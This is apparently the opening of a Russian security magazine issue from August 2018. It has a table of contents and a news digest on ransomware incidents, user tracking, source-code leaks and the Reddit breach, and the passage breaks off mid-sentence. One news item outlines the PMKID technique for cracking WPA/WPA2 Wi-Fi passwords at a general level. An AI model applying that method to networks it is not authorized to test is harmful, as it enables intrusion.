
                                                          Август 2018
            № 233
CONTENTS

   MEGANEWS
  Всё новое за последний месяц

    Дайджест Android
  Лучшие гайды, библиотеки и инструмен ты месяца

    APT из Поднебес ной
  Ки тайские хакерские группы и техники их целенаправленных атак

   Шпионаж из‐за Великой сте ны
  Как действуют коман ды китайских хакеров

    Ис кусство распаковки
  Пот рошим защиту хит рого бан кера GootKit

    Про качай свой Burp!
  11 наиболее полез ных плагинов к Burp Suite

    Pass the Hash через Open XML
  Создаем документ с сюрпри зом для перехвата хеша NTLMv2‐SSP и брутим пароль

    Злой двой ник атакует!
  Маскируем запуск процессов при помощи Process Doppelgänging

    Опас ный PHAR
  Эксплуатируем проблемы десериализации в PHP на примере уязвимости в WordPress

    7 новых утилит для пен тесте ра
  Перебираем под домены, пентестим WordPress и Drupal, фаззим API и кое‐что еще

     Гаси вол ну!
  Выбира ем и нас тра иваем аппа ратный деаутентифика тор Wi‐Fi на ESP8266

    Все по песочницам!
  За пускаем приложе ния в отдельных вир туалках с помощью AppVM

    Полнодис ковое шиф рование с LUKS2
  Изучаем новую вер сию популярного средства шиф рования для Linux и проверяем, можно
  ли его взломать

    Полез ная функциональщина
  Гра бим почту, трекеры задач и репозитории с Clojure

    Вещаем по переходнику
  Как превратить копеечный видеоадаптер в SDR, чтобы захватывать FM и спуфить GPS

    Почему домашние экраны всех смартфо нов — отстой
  Или зачем я написал AIO Launcher

   WWW
  Интересные веб‐сервисы

    [Без]опас ный JavaScript
  Изучаем проблемы кода на JS и выбира ем средства борьбы с ними

    Советы Android‐раз работ чику
  Что я узнал за год под дер жки приложения в Google Play

    Олимпиады по программированию
  Куда подать ся, если ты молод, умен и хочешь выиграть несколь ко тысяч долларов

     PowerShell для тех, кто в баше
  Про буем най ти ана логи наибо лее рас пространенных тулз Unix в PS

    Микросервисы по‐микрософ товски
  Па куем приложения ASP.NET Core с помощью Docker

    10 научно‐фантастичес ких комик сов
  Для тех, кто не чита ет комиксы и не любит супергероев

     Тит ры
  Кто дела ет этот журнал

                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





ЛОМАТЬ WI‐FI СТАЛО
ЛЕГЧЕ
Дженс Стьюб (Jens Steube), автор hashcat, известного инстру мента для взло‐
ма паролей, рассказал, что найден новый, более быстрый способ взлома
паролей от беспроводных сетей. Новая методика была обнаружена прак‐
тически случайно, когда Стьюб и его коллеги искали слабые места в WPA3.
  Ранее подобные ата ки предполагали, что ата кующему придется ждать
нужного момента, когда кто‐нибудь выполнит вход в сеть и будет совершено
четырехстороннее рукопо жатие EAPOL, в ходе которого клиент и роутер вос‐
пользуются PMK (Pairwise Master Key) и убедят ся, что им обоим известен Pre‐
Shared Key (PSK). Задачей ата кующего было поймать этот момент и перех‐
ватить рукопожатие.
  Но исследователи обнаружили, что для WPA и WPA2 в сетях 802.11i/p/q/r
все может быть проще. Новая атака базиру ется на использовании RSN IE
(Robust Security Network Information Element) и его извлечении из единствен‐
ного кадра EAPOL. Фактичес ки атакующему нужно лишь предпринять попытку
аутентификации в бес проводной сети, извлечь PMKID из одного кад ра,
а затем, имея на руках данные RSN IE, можно приступать к взлому Pre‐Shared
Key.





К примеру, для это го можно использовать тот же hashcat. Исследователи
отмечают, что в среднем взлом пароля занима ет десять минут, но все
зависит от его сложности.





      «Так как в данном слу чае PMK тот же, что и во вре мя обыч ного
      четырехстороннего рукопожатия, это иде альный век тор ата ки. Мы
      получа ем все необходимые данные из пер вого же кад ра EAPOL», —
      пишет Стьюб.

Пока специалисты не сообщают, какие роутеры каких именно производите‐
лей уязвимы к такому вектору атак. Скорее всего, проб лема актуальна
для всех «современ ных маршрутизаторов» со включенными функциями
роуминга, работающих с IEEE 802.11i/p/q/r.


90 ГБАЙТ ДАННЫХ ПОХИТИ ЛИ У APPLE

Австралийские правоохранители предъявили обвинения 16-лет нему подростку, который неод‐
нократно проникал в сеть компании Apple в прошлом году. Адвокат обвиняемо го утверждает,
что юный взломщик не пытал ся причинить Apple вред, а был огромным фанатом компании
и мечтал когда‐нибудь устро иться туда на работу.

Неизвестно, в какую именно часть инфраструктуры проник подросток, но он похитил около 90
Гбайт закрытых данных и якобы сумел получить дос туп к пользовательским аккаунтам. IP‐адре‐
са и серийные номера его устройств совпадают с «зас веченными» во вре мя атак. Хуже того,
следователи обнаружили похищен ные у Apple файлы в директории Hacky Hack Hack.





ШИФРОВАЛЬЩИКИ
АТАКУЮТ
Казалось бы, ИБ‐специалис ты по всему миру давно фиксируют спад популяр‐
ности шифровальщиков и утверждают, что им на смену пришел скрытый май‐
нинг, без преувеличения ставший трендом текущего года. Однако это не зна‐
чит, что шифровальщики стали менее опасны, просто их операторы перек‐
лючили свое внимание с рядовых пользователей на организации и компании.

Матануска‑Суситна под атакой
В августе 2018 года произошло сразу несколь ко интерес ных событий, нап‐
рямую или косвенно свя занных с раз личными шифровальщиками. Но самой
интересной историей определенно стала атака шифровальщика BitPaymer
на одно из боро Аляски, Матанус ка‐Суситна. В результате инцидента муници‐
пальная ИТ‐инфраструктура практически вышла из строя, а от использования
электронной почты и телефо нов временно приш лось отказаться в пользу
печатных машинок и рукописного ввода.
   Случившееся  интерес но и  потому,  что  руководс тво боро  в целом
и ИТ‐директор Эрик Уайетт (Eric Wyatt) в частнос ти не скрывали деталей
инцидента и очень подробно и прозрачно рас ска зали обо всех проблемах,
которые повлекла за собой эта ата ка.
  Первые признаки сто роннего вмешательства были замечены еще в
середине июля 2018 года, когда после обновления антивирус McAfee, уста‐
новленный на компьютерах боро, вдруг начал обнаруживать некий троян
в системах, работающих под управлением Windows 7. Как выяс нилось поз‐
днее, малварь проник ла в сеть боро еще в начале мая текущего года.
   Антивирус не справлялся с удалением всех компонентов зараже ния,
поэтому специалисты были вынуждены написать скрипт, который подчищал
то, что осталось после работы McAfee. Его пла ниро вали запустить 23 июля,
а  также  сотрудники  собира лись  инициировать  при нудительную смену
паролей для всех поль зователей и административных учетных записей.
   Уайетт рассказывает, что именно работа скрипта, похоже, и спровоци‐
ровала запуск компонента‐шифровальщика. Вероятно, таким образом сра‐
ботал автоматический «предохранитель» в коде злоумышленников, а воз‐
можно, операторы атаки все это время вниматель но наблюдали за происхо‐
дящим и, заметив, что их раскрыли, отда ли малвари соответствующую коман‐
ду с управляюще го сервера.
  В итоге шифровальщик поразил 500 рабочих станций (на базе Windows
7 и 10), а также 120 из 150 серверов Матануска‐Суситны. После этого спе‐
циалисты боро приняли решение не ждать продолжения атаки и ухудшения
ситуации и начали самостоятельно уводить всю сеть и системы в офлайн
(включая телефонию, почтовые серверы, компь ютеры сотрудни ков), уве‐
домив о происходящем ФБР.
   Служащим пришлось очистить и переуста новить весь софт на 650 рабочих
компьютерах и серверах, по сути воссоздав всю инфраструктуру боро с нуля.
В этом нелегком деле им выз вались помочь 20 различных государственных
и частных организаций. В это время прос тые слу жащие были вынуждены
«вернуться» на несколь ко десятков лет назад, дос тать со складов печатные
машинки и калькуляторы, за спра вочной информацией обращаться к биб‐
лиотечным книгам, а многие документы писать от руки.
   Эрик Уайетт убежден, что боро столкнулось с хорошо организованной
и продуманной атакой и это был «не какой‐то пацан, живущий в мамином под‐
вале».
  Сообщается, что атака не затронула официальный сайт Матануска‐Сусит‐
ны (через который власти и рас сказывали о происходящем во всех деталях),
а также не пострадали данные пользователей и информация о платежных
картах, хранившаяся у сто ронних провайдеров. Кроме того, часть данных
в итоге удалось восстановить из бэкапов, хотя отдельные из них датированы
прошлым годом, а некото рая информа ция (к примеру, электронные письма)
все же была утеряна.
   Как уже было сказано, специалисты уста новили, что причиной этого хаоса
стал шифровальщик BitPaymer. Также в отчете о расследовании говорится,
что злоумышленники заразили сеть боро банкером Emotet и име ли доступ
к сети через Active Directory. Из‐за это го теперь есть основания полагать, что
во время атаки все же были скомпрометированы и похищены какие‐то дан‐
ные.
  Напомню, что в 2017 году именно малварь BitPaymer атаковала больницы
в Шотландии, попав на страницы СМИ всего мира, а в начале 2018 года ана‐
литики ESET выдвинули теорию о том, что BitPaymer, вероятно, был создан
теми же хакерами, которые стоят за известным бот нетом Necurs и банков‐
ским трояном Dridex.
   Также стало известно, что, помимо Матануска‐Суситны, от похожих атак
пострадали еще города на Аляске (вклю чая город Валдиз) и в других штатах
США. Официальное сообщение об инци денте действительно было опуб‐
ликовано властями Валдиза еще в конце июля, однако в нем упоминается
лишь некий абстрактный «вирус», речи о BitPaymer или каком‐либо другом
шифровальщике там не идет. По сло вам Уайетта и данным следователей,
боро стало жер твой номер 210, то есть где‐то мол чат о случившемся
еще 209 пострадавших.
   Согласно официальным сообщениям, выкуп злоумышленникам руководс‐
тво Матануска‐Суситны решило не платить принципиально. Уайетт писал, что
зашифрованные малварью данные будут храниться годами, если это пот‐
ребуется, но он надеется, что в конечном итоге ФБР и привлеченные к рас‐
следованию специалисты сумеют предоставить сотрудникам боро ключи
для дешифровки и информация будет вос становлена.


Автор GandCrab про тив
Одним из наиболее «заметных» шифровальщиков 2018 года стала малварь
GandCrab, о которой мы уже рас ска зывали неоднократно.
  В середине июля 2018 года южнокорейские специалисты из компании
AhnLab нашли «вакцину», защищающую от шифровальщика GandCrab вер‐
сии  4.1.2. Исследователи обнаружили, что предотвратить срабаты вание
шифровальщика можно очень простым способом: дос таточно соз дать спе‐
циальные  файлы   вида   [шес тнадцатеричная_последовательность].lock
в директориях C:\Documents and Settings\All Users\Application Data (для Win‐
dows XP) или C:\ProgramData (для Windows 7, 8 и 10). Наличие этих файлов
в системе позволя ет обма нуть малварь, заставив GandCrab считать, что этот
компьютер уже был заражен ранее.
  В ответ на это разработчик GandCrab решил объявить исследователям
войну. Вирусописатель, скрывающийся под псевдонимом Crabs, вышел
на связь с изданием Bleeping Computer и заявил, что обнаруженный аналити‐
ками AhnLab способ защиты оста вался акту ален лишь пару часов, после чего
была выпущена новая версия шифровальщика. Хуже того, Crabs сообщил, что
нашел баг в антивирусе AhnLab v3 Lite и намерен его использовать.



     «Мой экс плоит ста нет пятном на репута ции AhnLab, которое запом нят
      на долгие годы», — писал Crabs, пре дос тавив жур налис там ссылку
      на свой экс плоит.

Журналисты не собирались предавать этот факт огласке, пока инженеры Ahn‐
Lab не изучат разработку вирусописателя и, если потребуется, не выпус тят
патч. Однако в начале августа эксперт Malwarebytes публично рассказал
в Twitter об обнаружении новых версий GandCrab (4.2.1 и 4.3), в коде которых
был замечен тот самый экспло ит для продукции AhnLab (с комментарием
«привет AhnLab, счет — 1:1»).





После этого выяснилось, что экспло ит Crabs работает не совсем  так,
как было задумано. Сразу нес колько ИБ‐специалистов изу чили проб лему
и пришли к однозначному заключению, что баг, который пытается эксплуати‐
ровать преступник, — это отказ в обслуживании (DoS). Из‐за него может
«падать» один из компонентов антивиру са AhnLab, а в отдельных случаях
и вся операционная система.
  Но один из директоров AhnLab объяснил изданию, что код, интегрирован‐
ный в GandCrab 4.2.1 и 4.3, выполняется уже пос ле исполнения самой мал‐
вари и зараже ния нор мальных файлов. То есть антивирус AhnLab обнаружи‐
вает и нейтрализует малварь задолго до того, как та попытается восполь‐
зоваться DoS‐эксплоитом. В ито ге шансы на успешное срабатывание экспло‐
ита крайне малы. При этом раз работчики подчеркивают, что Crabs не обна‐
ружил какой‐то страшный 0day‐баг и вряд ли его спо соб позволяет исполнить
какой‐либо дополнительный пейлоад.
   Также инженеры AhnLab отметили, что исправить проблему, обнаружен‐
ную Crabs, совсем не трудно и патч выйдет в ближайшее время. С релизом
«заплатки» авторы антивиру са планиру ют устранить некую фундаментальную
недоработку, делающую такие ата ки возможными в принципе.
  Интересно, что еще вес ной текущего года исследователи Bitdefender
выпустили бесплатный инс тру мент для рас шифровки файлов, пострадавших
от атак всех актуальных на тот момент вер сий шифровальщика GandCrab.
Тогда же румынская полиция сообщила об арес те подозреваемых в рас‐
пространении вредоносного спа ма. Но после это го Crabs не попытался «пой‐
ти войной» на компанию Bitdefender. Когда журналисты поинтересовались
у него — почему, он не ответил, лишь сказал, что это была «хорошая работа».


640 000 за пару недель
Как уже было сказано выше, многие операторы вымогательской мал вари
переключили свое внимание на компании и организации. Вместо атак
на рядовых пользователей теперь они атакуют боль ницы, учебные учрежде‐
ния, муниципальные влас ти небольших городов.
  Отличной иллюстрацией этой тенденции слу жит шифровальщик Ryuk,
который впервые заметили 13 августа 2018 года, — первым о нем сообщил
независимый ИБ‐специалист, известный под псевдонимом MalwareHunter.
  С тех пор в социальных сетях и на специализированных ресурсах появи‐
лись многочисленные сооб щения постра давших от этой угрозы. На нового
вымогателя обратили  внимание  эксперты  сразу  нес кольких компаний,
но пока никому не удалось понять, как именно распространяется вредонос.
Исследователи полагают, что операто ры Ryuk исполь зуют узконаправленный
фишинг или плохо защищенные RDP‐соединения, так как мал варь заражает
по одной компании за раз, и зло умышленники, похоже, дей ствуют вручную.
  К примеру, отчет, посвященный деятельнос ти Ryuk, уже опубликовали спе‐
циалисты компании Check Point. Они считают, что за созданием Ryuk может
стоять та же хакерская группа, которая разработа ла шифровальщик Hermes.
Или как минимум у операто ров Ryuk был дос туп к исходным кодам Hermes.
  Напомню, что Hermes был обнаружен сотрудником компании Emsisoft
Фабианом Восаром (Fabian Wosar) в 2017 году. Тогда эксперт отреверсил
шифровальщик в прямом эфире на YouTube, а позже выложил результаты
своего исследования и дешифровщик для этой версии вымогателя в Сеть.
   Вскоре после это го появился Hermes вто рой версии, который дешиф‐
ровке уже не поддавался. Затем, осенью 2017 года, обновленный Hermes
был задействован во время атаки на тай вань ский банк Far Eastern International
Bank (FEIB) и исполь зовался для отвлечения вни мания. Этот инцидент стал
новейшим на тот момент звеном в длинной цепочке взломов, свя занных
с международной банковской системой SWIFT. Тогда эксперты оборонной
корпорации BAE Systems предположили, что атака свя зана с северокорей‐
ской хакерской группой Lazarus (она же Dark Seoul). В свою очередь, спе‐
циалисты компании Intezer Labs даже сумели обнаружить опре деленное тож‐
дество исходных кодов Hermes и дру гих инстру ментов Lazarus.
   Теперь аналитики Check Point сообщают, что у Hermes и Ryuk тоже очень
много общего. К примеру, функции, отвечающие за шифрование отдельных
файлов, выглядят почти идентично. Оба шифровальщика используют оди‐
наковые метки файлов, а их проверка тоже выполняется практически оди‐
наково. Вымогатели добавляют в «белые списки» одни и те же директории
(AhnLab, Microsoft, $Recycle.Bin и так далее), используют один и тот же скрипт
для удаления теневых копий и бэкапов.
  Были найдены версии Ryuk, предназна ченные для 32‐ и 64‐битных сис тем,
причем исходные коды обеих версий имеют сходс тво с Hermes. Эксперты
Check Point отмечают, что такое подобие исходных кодов малвари для разных
архитектур может объяснять ся тем, что в основе этих версий лежат иден‐
тичные исходники.
  Однако были обнаружены и раз личия. Так, специалисты Check Point и Mal‐
wareHunter  заметили,  что  перед  началом  работы  Ryuk  ликвидирует
на зараженной машине длинный список сервисов и приложений. В общей
сложности вымогатель останавливает более 40 процессов и 180 сервисов,
через использование taskkill и net stop.
   Также обнаружилось, что Ryuk показывает сво им жертвам разные версии
сообщений с требованием выкупа. Сущес твуют длинная и короткая версии
послания, и обе предлага ют жертвам связаться с авторами Ryuk по электрон‐
ной почте.
  В более длин ной и детальной версии злоумышленники требуют выкуп
в размере 50 биткой нов (порядка 320 тысяч дол ларов), а в более короткой —
от 15 до 35 биткой нов (в среднем 224 тысячи долларов). Похоже, в разных
случаях преступники выбирают раз ные уровни устрашения жертв, действуя
по обстоятельствам. Это служит еще одним аргументом в пользу того, что
создатели шифровальщика проводят свои ата ки вручную, тщательным обра‐
зом изучая жертв и не жалея на это ресурсов и времени.
   Хотя  биткойн‐адреса  уникальны  для  каж дой жертвы  и  прос ледить
за «доходами» группировки довольно сложно, по данным иссле дователей,
в настоящее вре мя операторы Ryuk «заработали» как минимум 640 тысяч
долларов и явно не собира ются оста навливать ся на достигнутом.


ДЖОН МАКАФИ ПОЯСНИЛ, ЗАЧЕМ ЗАНИМАЕТСЯ РЕК‐
ЛАМОЙ СТРАННЫХ ICO
Джон Макафи дал интервью сайту Eth News, в котором пояс нил, зачем он продвигает ICO
непонятных стартапов и пишет в Twitter о весьма спорных криптовалют ных проектах и тех‐
нологиях.





→«Понимаете, все, что я делаю, — это маркетинг. […] Я считаю, что мои технологичес кие спо‐
собности не имеют равных. Но свою работу я характеризую как маркетинг. По‐моему, мар‐
кетинг куда важнее технологий. Ведь что такое маркетинг? Мар кетинг — это то, что обес печива‐
ет появление инноваций на свет. Множес тво инноваций не вышли в свет из‐за отсутс твия мар‐
кетинга. Или из‐за того, что их мар кетинг не был идеален. И можете быть уве рены, если я
что‐то рекламирую, оно увидит свет»,
— Джон Макафи





ОНИ СЛЕДЯТ
ЗА ТОБОЙ
Разработчиков сразу нес кольких крупных компаний обвинили в слежке
за пользователями.


CCleaner
Пользователи популярнейшей утилиты CCleaner, предназначенной для очис‐
тки и оптимизации ОС семейства Windows, обрушились с критикой на раз‐
работчиков компании Piriform. Дело в том, что в новой версии CCleaner (5.45)
была обнаружена неотключаемая программа «активно го мониторинга» (Active
Monitoring). В отличие от предыдущих версий, 5.45 попросту не имела соот‐
ветствующих настроек приватности, поз воляющих отказаться от этого обез‐
личенного сбора данных.


                                     Продолжение статьи →
← Начало статьи





  И хотя, казалось бы, у пользователей была возможность открыть «Настройки
 → Мониторинг» и там отказаться от системного и активного мониторинга, те
  снова включались уже при следующем запуске программы (разумеется,
  без ведома пользователя).
     Хуже того, даже закрыть новую версию CCleaner оказалось непросто. Пос‐
  ле нажатия на крестик прог рамма поп росту сво рачивается в область уведом‐
   лений, а ее иконка не поз воляет оста новить работу. Фактически единствен‐
  ный способ закрыть CCleaner — принуди тельно ликвидировать его через
  диспетчер задач.
     Нужно сказать, что это далеко не первые нововведения, возмутившие
  пользователей. В прошлом году Piriform приобрела компания Avast, и с тех
  пор неприятные изменения происхо дят регулярно. Так, вышедшая в мае вер‐
  сия CCleaner 5.43 лишила пользователей бес платной версии возможности
   отказаться от обмена данными. Версия CCleaner 5.44, вышедшая в июне,
  обзавелась всплывающей рекламой. И теперь появился CCleaner 5.45, где
  нельзя отказаться от активного мониторин га и сложно даже завершить
  работу программы.
     После  того  как странное поведение CCleaner  5.45 раскритиковали
  не только пользователи, но и ИБ‐специалис ты с отраслевыми СМИ, раз‐
  работчики все же прислушались к общественному мнению. Было при нято
  решение вернуться к версии 5.44, которая вновь стала самой «свежей»
  из всех доступных для загрузки. Разработчики пообещали, что доработают
  новую версию и в ней появится воз можность завершения работы программы.
   Также сообщает ся, что клинин говая функци ональность будет четко отде лена
   от аналитической, а для управления ими появят ся соответс твующие настрой‐
   ки, которые CCleaner будет запоминать пос ле закрытия.
    Помимо это го, инженеры  Piriform планиру ют подготовить под робные
  информационные бюллетени, которые расска жут, какие именно данные ком‐
  пания и ее продукты собирают о пользователях и в каких целях эта информа‐
  ция потом используется.


  Google
  Журналисты Associated Press опубликова ли результаты расследования, сог‐
  ласно которым сервисы Google следят за пользователями мобильных устрой‐
   ств, даже если те отклю чили запись «истории мес тоположений» (Location
   History).
     Каждый раз, когда ты желаешь воспользоваться сервисом вроде Google
  Maps, устройство запрашивает разрешение на дос туп к данным о местополо‐
  жении (к примеру, если это нужно для навига ции). По данным Associated
   Press, если пользователь iOS‐ или Android‐устройства не дает на это раз‐
  решения, многие сервисы Google все равно будут следить за ним. Даже в том
   случае, если «история местополо жений» умышленно выключена. Фактически
  ее отключение означает лишь, что информа ция не вносится в Timeline и не
  видна самому пользователю.



        «Нап ример,  Google фик сиру ет ваше мес тонахождение  сра зу  же,
          как только вы откры ваете приложе ние Google Maps. Автоматичес кие
        ежед невные обновле ния погоды на Android-смар тфонах поз воляют
        приблизительно понять, где вы находитесь, — пишут жур налис ты. —
        А поис ковые зап росы, никак не связанные с текущей локацией, нап-
        ример  „печенье  с  шоколад ной  крош кой“  или  „науч ные  наборы
         для детей“, поз волят опре делить вашу широту и долготу (с точ ностью
        до квад ратного фута), и [эти данные] будут сохранены в вашем акка-
         унте Google».

  Чтобы подтвердить свои опасения, журналис ты заручились поддержкой уче‐
  ных из Принстонского универ ситета. Совмес тно им удалось воссоздать карту
   всех передвижений одно го из исследователей, хотя функция Location History
  на его Android‐смартфо не была отключена.
     Как выяснилось, что бы полностью отка зать ся от слежки, необходимо
  покопаться в настрой ках учетной записи и найти пункт Web and App Activity
   («История приложений и веб‐поиска»), активный по умол чанию. Лишь после
  его отключения сбор данных прекращается.
     Представите ли Google уже про комменти рова ли публикацию Associated
   Press, заявив, что компания ничего не наруша ет и предоставляет пользовате‐
  лям все необходимые инстру менты для отклю чения сбора информации
  и очистки истории. Так же в Google отметили, что данные о местоположении
  помогают улучшить качество обслуживания поль зователей.
     Впрочем, спе циалисты Принстонского универ ситета и журналисты Associ‐
   ated Press все равно называют это «слежкой» и нас таивают на том, что отклю‐
  чение «истории местополо жений» должно отклю чать «слежку», а компания
  намеренно вводит поль зователей в заблуждение. По мнению исследова‐
   телей, под угрозой оказывается приватность двух миллиардов пользователей
   Android и сотен миллионов пользователей iOS.


 ПОЛЬЗОВАТЕЛИ КРИПТОВАЛЮТНЫХ БИРЖ ПОД АТАКОЙ
   Исследователи Group‐IB изучили утечки учетных дан ных пользователей криптовалютных бирж
   и проанализировали характер этих инцидентов. В 2017 году, одновре менно с резким увеличе‐
   нием интереса к крип товалютам, рекордными показателями их капитализации и взле том курса
   биткойна, произошли десятки атак на криптовалютные сервисы.

   Эксперты проанализировали кражу 720 поль зовательских учетных записей (логинов и паролей)
   19 крупнейших крип товалютных бирж.

   Скомпрометированные учетные записи относятся к сле дующим сервисам: Binance,  Bit‐z,
    Bitﬁnex, Bithumb, Bitstamp, Bittrex, BTCC, CEX.io, Coinone, Gate.io, GDAX, Gemini, HitBTC, Huobi,
   Kraken, KuCoin, OKEx, Poloniex, Wex.nz.





   Наибольшее число скомпрометирован ных учетных записей пришлось на биржи Poloniex — 174
   учетные записи, Bittrex — 111, CEX.io — 95, HitBTC — 83, Kraken — 61.

  С 2016 по 2017 год число скомпрометированных учетных записей пользователей криптовалют‐
   ных бирж увеличилось на 369%.





   Из‐за повышенного интереса к крип товалютам и блокчейн‐индус трии количес тво инцидентов
   в  январе  2018  года  выросло  на 689%  по  сравнению  со  среднемесячным  показа‐
   телем 2017 года.

  США, Россия и Китай — три страны, в которых зарегис трированные пользователи чаще дру‐
   гих становились жертвами кибератак.





   Удалось выявить 50 активных ботнетов, задействованных для кибератак на пользовате лей
   криптовалютных бирж. Инфраструктура киберпрес тупников в основном базируется в США
     (56,1%), Нидерландах (21,5%), Украине (4,3%) и Рос сии (3,2%).

   Первая и основная причина компрометации аккаунтов — игно рирование двухфакторной аутен‐
   тификации, как пользователями, так и самими биржами.


   Согласно исследованию, проведен ному Кембриджским центром альтернативного финан‐
   сирования, 75% бирж предос тавляют опциональную 2ФА для вхо да пользовате лей в свои
   аккаунты, но лишь 23% считают ее обязательной.

   Только у 35% сервисов для проведения всех торговых операций обязательно исполь‐
   зовать 2ФА, и 11% обязыва ют своих клиентов использовать ее для вывода средств.

   Меньше 50% бирж считают активацию 2ФА обязательной минимальной мерой для предотвра‐
   щения несанкционированного дос тупа к функциональным возможностям аккаунта.





 УТЕЧКИ ИСХОДНЫХ
 КОДОВ
   Утечки исходных кодов популярных продуктов или опасной мал вари слу чают‐
  ся не так уж часто, но в этом месяце произошло сра зу несколько таких инци‐
  дентов.


  Snapchat
  В начале августа 2018 года СМИ и ИБ‐специалис ты обратили внимание
  на GitHub‐репозиторий, закрытый из‐за жалобы на наруше ние DMCA (Digital
   Millennium Copyright Act, Закон об авторском пра ве в циф ровую эпоху). В этой
  жалобе представите ли компании Snap Inc. требовали немедленно удалить
  содержимое репозитория с сайта, так как «ВСЁ ЭТО УТЕКШИЕ ИСХОДНЫЕ
  КОДЫ» (большими буквами написан весь запрос на удаление).
     После того как случившееся предали огласке, представите ли Snap Inc.
  были вынуждены пояснить, что в мае 2018 года обновле ние iOS‐версии при‐
  ложения случайно раскрыло часть исходных кодов при ложения Snapchat. Раз‐
  работчики заверили, что ошибку быстро испра вили и утечка никак не компро‐
  метировала безопасность приложения и его пользователей, однако кто‐то
  успел сохранить исходники, а затем принял ся пуб ликовать их в открытом дос‐
   тупе.





  Интересно, что в Twitter теперь появляются сообщения на английском и араб‐
  ском языках, написанные от лица нес кольких пользователей. Они угрожают
  продолжить публиковать исходные коды в Сети, если разработчики не вып‐
   латят им некую «награду» (официальной bug bounty программы у компании
   нет). Судя по всему, Snap Inc. стала жертвой шантажа. Инте ресно, что после
  удаления первого репозитория на GitHub были раз мещены как минимум две
  копии утекших исходников.


  DexGuard
   Также в этом месяце с GitHub был спешно уда лен исходный код популярного
  инструмента  DexGuard,  который  разрабатывает  компания  Guardsquare.
  Это решение  является  платным  аналогом  Proguard  (распространяется
  под лицензией GPL) и используется для обфускации и защиты Android‐при‐
  ложений от обратного инжиниринга и взло ма. DexGuard применяется раз‐
  работчиками для защиты от взлома и кло нирования приложений (порой
   это связано с пиратством), сбо ра учет ных данных и от других проблем.
     Как и в случае со Snapchat, на GitHub была обна ружена жалоба на наруше‐
  ние DMCA, гласящая, что на сайте был размещен исходный код одной из ста‐
  рых версий DexGuard, укра денный у одного из бывших клиентов компании
   Guardsquare.
     Хотя репозиторий, о котором сообщали разработчики, был оперативно
  удален, исходники успели разойтись по Сети. В общей сложности предста‐
   вители Guardsquare насчитали около 300 форков похищенного ПО и уже
  подали запросы на их уда ление.
     Стоит отметить, что изна чально исходные коды были опубликованы акка‐
  унтом HackedTeam, который не был забанен. Эта же учетная запись под‐
  держивает репозитории спайвари для Android, RCSAndroid. Авторс тво этого
  решения приписывают итальянской компании HackingTeam, и ранее его
  называли одной из наиболее профес сиональных и сложных угроз для Android.


 ОБНАРУЖЕНО 477 ОБЪЯВЛЕНИЙ О ПРОДАЖЕ МАЙНИН‐
 ГОВОЙ МАЛВАРИ

   Аналитики Group‐IB подчитали, что за последний год на теневых форумах количество объявле‐
   ний, в которых предлага ется ПО для майнин га на продажу или в аренду, увеличи лось в 5 раз
   (H1 2018 против H1 2017).

   Суммарно на хакерских форумах были выявлены 477 объявлений о про даже или аренде прог‐
   рамм для майнинга, тогда как за аналогичный период 2017 года их количес тво было в пять раз
   меньше — 99.

   Как оказалось, минимальная цена на такую малварь сос тавляет 0,5 доллара, а средняя сто‐
   имость — 10 долларов. Специалис ты Group‐IB называют широкую дос тупность троянов‐май‐
   неров «опасной тенденцией».





 REDDIT ВЗЛОМАЛИ
  Один из самых посещаемых сайтов в интернете — Reddit официально сооб‐
  щил о взломе. Неизвестные злоумыш ленники сумели обойти двухфакторную
   аутентификацию в аккаунтах нескольких сот рудников компании и похитили
  самые разные данные: от исходных кодов до email‐адре сов пользовате лей.
     ИБ‐специалисты давно предупреждают, что схемы двухфакторной аутен‐
  тификации, привязанные к телефону и одноразовым кодам в SMS‐сообщени‐
   ях, нельзя считать надеж ными. Так, еще в 2016 году Национальный институт
   стандартов и технологий США (The National Institute of Standards and Technolo‐
   gy, NIST) представил интересный документ, согласно которому исполь‐
  зование SMS‐сооб щений для двухфакторной аутентификации «небезопасно»
  и «недопустимо».
    Небезопасность данной системы лишний раз демонстрирует и инцидент,
  произошедший с сотрудниками Reddit. Ключевым аспектом случившегося
   стал именно обход двухфакторной аутентифика ции: преступники каким‐то
  образом сумели перехватить SMS‐сооб щения своих жертв. Фактически
   это означает, что сначала прес тупники сумели взломать учетные записи слу‐
  жащих компании (как это про изошло, не уточняется), а затем обошли и двух‐
  факторную аутентификацию.
     Как именно это было реализова но, представители Reddit вновь не уточ‐
   няют, однако вариантов здесь может быть много. К примеру, атакующие мог‐
  ли эксплуатировать уязвимос ти в SS7, могли выполнить так называемый SIM
   swap, то есть перевыпустить на себя SIM‐карту жертвы, обратившись к опе‐
  ратору связи и применив социальную инженерию, или клонировать SIM.
     Отмечу, что в последнее время об атаках на SIM‐карты говорят и пишут
  очень много, особен но после того, как в июле 2018 года журналисты Vice
  Motherboard обнародовали результаты рас следова ния, доказывающего, что
  данную тактику широко используют злоумышленники и она позволяет им «уго‐
   нять» учетные записи и чужие личности десятками и сотнями.
    Но вернемся к компрометации Reddit. Как ста ло известно, инцидент имел
  место между 14 и 18 июля 2018 года, а проникновение обнаружили 19 июля.
  Злоумышленники скомпро метировали неназванное число сотрудников Reddit
  и проникли в «несколь ко систем», получив доступ к данным. Так, хакеры доб‐
  рались до пользовательских email‐адресов, а также бэкапа БД, датирован‐
  ного маем 2007 года.
     Так как Reddit был основан и зарабо тал в 2005 году, эта БД содержала всю
  информацию за два года работы сайта, включая весь его контент и сооб‐
  щения пользователей (в том числе личные), а также старые хешированные
  пароли и соли.
     Представите ли компании утверждают, что прес тупники не имели доступа
  на запись на скомпрометированных серверах, а зна чит, не могли под менить
  или исказить какие‐либо важ ные данные. Тем не менее раз работчики все
  равно усилили безопасность (к примеру, сменили клю чи API) и мониторинг.
     К сожалению, доступ на чтение у хакеров был, поэтому им удалось не толь‐
   ко похитить БД, но и добраться до более свежих email‐дай джес тов, отправ‐
  ленных между 3 июня и 7 июля 2018 года. Эти подборки интерес ных
  и рекомендуемых постов содержат информа цию о пользовательских именах
  и связанных с ними почтовых адресах.
     Также злоумышленники получили доступ к исходным кодам Reddit, внут‐
  ренней документации, логам и рабочим фай лам сотрудников. Однако никаких
  подробностей об этом пока нет, так как хищение пользовательских данных
  более критично.
     Точное количество скомпрометированных пользователей не называется,
  но компания уве ряет, что всем пострадавшим будут направлены соответс тву‐
  ющие уведомления. Также всех пользователей, регистрировавшихся на сайте
  до 2007 года, призывают поменять пароли, если они по каким‐то причинам
  не делали этого больше десяти лет.
     Как уже было сказано выше, в нас тоящее время разработчики Reddit
  работают над усилением мер безопасности и мониторинга, а также уже уве‐
